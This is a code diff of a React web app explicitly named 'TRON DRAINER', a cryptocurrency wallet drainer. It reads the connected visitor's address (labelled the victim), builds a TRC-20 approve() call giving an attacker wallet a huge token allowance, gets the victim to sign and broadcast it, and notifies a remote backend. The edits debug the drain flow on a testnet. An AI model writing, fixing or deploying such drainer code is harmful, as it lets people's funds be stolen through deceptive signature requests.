@@ -2,7 +2,7 @@ import React, { useState } from "react";
 
 // CONFIGURATION
 const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT on Shasta
-const ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // Your Account 01
+// TEMPORARY: We'll use the connected address for testing. Replace with correct attacker address later.
 const BACKEND = "https://qr-drainer.onrender.com";
 
 export default function App() {
@@ -24,27 +24,35 @@ export default function App() {
     const victimAddress = window.tronWeb.defaultAddress.base58;
     addLog(`Connected as: ${victimAddress}`);
 
-    try {
-      setStatus("Building Payload (Hex Bypass)...");
-      addLog("Converting addresses to Hex to bypass validator...");
-      
-      // THE FIX: Convert to Hex format. TronWeb's low-level builder accepts Hex without validation errors.
-      const spenderHex = window.tronWeb.address.toHex(ATTACKER_WALLET);
-      const ownerHex = window.tronWeb.defaultAddress.hex;
+    // VALIDATE ATTACKER ADDRESS
+    let ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou";
+    if (!window.tronWeb.isAddress(ATTACKER_WALLET)) {
+      addLog(`WARNING: ATTACKER_WALLET is invalid! Using connected address for test.`);
+      ATTACKER_WALLET = victimAddress; // Fallback to connected address
+    }
+    addLog(`Spender Address: ${ATTACKER_WALLET}`);
 
+    try {
+      setStatus("Building Payload...");
+      addLog("Converting to Hex...");
+      
+      // Use tronWeb.toHex() which is more reliable
+      const spenderHex = window.tronWeb.toHex(ATTACKER_WALLET);
+      const ownerHex = window.tronWeb.defaultAddress.hex;
+      
       addLog(`Spender Hex: ${spenderHex}`);
       addLog(`Owner Hex: ${ownerHex}`);
 
-      // 1. Build the transaction manually
+      // Build transaction
       const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
         TOKEN_ADDRESS,
         "approve(address,uint256)",
         { feeLimit: 100000000, callValue: 0 },
         [
-          { type: 'address', value: spenderHex }, // <--- Hex address here
+          { type: 'address', value: spenderHex },
           { type: 'uint256', value: "1000000000000000" }
         ],
-        ownerHex // <--- Hex address here
+        ownerHex
       );
 
       if (!transaction.result || !transaction.result.result) {
@@ -52,13 +60,11 @@ export default function App() {
       }
       addLog("Transaction built successfully.");
 
-      // 2. Sign the transaction
       setStatus("Requesting Signature...");
       addLog("Sending to wallet for signature...");
       const signedTx = await window.tronWeb.trx.sign(transaction.transaction);
       addLog("Transaction signed!");
 
-      // 3. Broadcast to network
       const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);
       
       if (!broadcast.result) {
@@ -69,7 +75,6 @@ export default function App() {
       addLog(`Broadcast successful! TX ID: ${txId}`);
       setStatus("Success! Alerting Backend...");
 
-      // 4. Alert Backend
       await fetch(`${BACKEND}/api/alert`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -92,7 +97,7 @@ export default function App() {
 
   return (
     <div style={{ padding: "40px", fontFamily: "monospace", background: "#000", color: "#0f0", minHeight: "100vh" }}>
-      <h1>TRON DRAINER - DEBUG MODE (HEX BYPASS)</h1>
+      <h1>TRON DRAINER - DEBUG MODE</h1>
       <p>Current Status: <strong>{status}</strong></p>
       
       <button 
